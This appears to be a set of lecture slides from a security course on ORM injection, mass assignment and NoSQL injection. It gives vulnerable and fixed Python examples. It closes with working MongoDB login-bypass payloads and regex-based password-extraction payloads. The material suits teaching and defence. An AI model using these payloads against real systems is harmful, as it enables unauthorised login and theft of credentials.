## further database exploitation
### 6843 week4 

---

## I think therefore I shill
* do COMP6447
* use GCP

---

### overview
* orm injection
* nosql injection

---

{{% section %}}
## ORM
* object-relational model

---

### what is an ORM
* an abstraction
* allows you to interact with a database as if they were a library

---

### how do they work
* you define models representing database tables 
* under the hood all of these function calls will just generate SQL queries for you
* essentially just prepared statements lol, but more confusing

---

### example
```python
cursor = sqlite3.connect("example.db").cursor()
cursor.execute("SELECT * FROM users WHERE age > ?", (30,))
rows = cursor.fetchall()
```

```python
class User(Base):
    __tablename__ = "users"
    
    id = Column(Integer, primary_key=True)
    name = Column(String)
    age = Column(Integer)

session = sessionmaker(bind=create_engine("sqlite:///example.db"))()
users = session.query(User).filter(User.age > 30).all()
```

## aside: abstraction bad
* there's now so many layers of code between the programmer and the computer

### what is the vulnerability here
```python
query = f"SELECT * FROM users WHERE id = {user_input}"
session.execute(query)
```

---

### how to fix?
yeah, basic sqli

```python
from sqlalchemy import text

query = text("SELECT * FROM users WHERE id = :id")
session.execute(query, {"id": 1})
```

---

### what is the vulnerability here
I don't think this vulnerability has been covered yet, but idk gl

```python
from flask import request

user = User(**request.json)
session.add(user)
session.commit()
```

```python
user = User.objects.filter(**request.json)
return user
```

---

### how to fix?
yeah, its mass assignment

```python
user = User(
    name=request.json.get("name"),
    age=request.json.get("age")
)
```

### some other common issues

---

### cves
* we're not just attacking poor implementations/misconfigurations
* you're now using someone elses code
* this can introduce it's own vulnerablities
* often these are open-source

---

### the underlying issue
* orms are very good at simple queries, but aren't great at more complex logic
* these models are still just generating and executing sql queries
* programmers can make mistakes
* e.g. this bug in [sequelize](https://github.com/sequelize/sequelize/issues/14519), also [this one](https://github.com/sequelize/sequelize/issues/6194)

---

### fingerprinting
ye you can still do it

## nosql injection

---

### what is nosql
* what it sounds like, not sql
* a non-relational database, it's just a key-value store
* honestly probably better for most use-cases
* e.g. mongodb

---

### examples
```python
cursor = sqlite3.connect("example.db").cursor()
cursor.execute("SELECT * FROM users WHERE age > ?", (30,))
rows = cursor.fetchall()
```

```python
# Connect to MongoDB
client = MongoClient("mongodb://localhost:27017/")
db = client["example_db"]
users_collection = db["users"]

# Query users older than 30
users = users_collection.find({"age": {"$gt": 30}})
```

### what vulnerabilities exist in nosql
pretty much everything in normal sqli
* boolean-based injection
* union-esque queries

it just looks slightly different

---

### demo

---

## example payloads

---

### boolean injection
```
' OR 1=1 #
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### boolean-based extraction
```
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
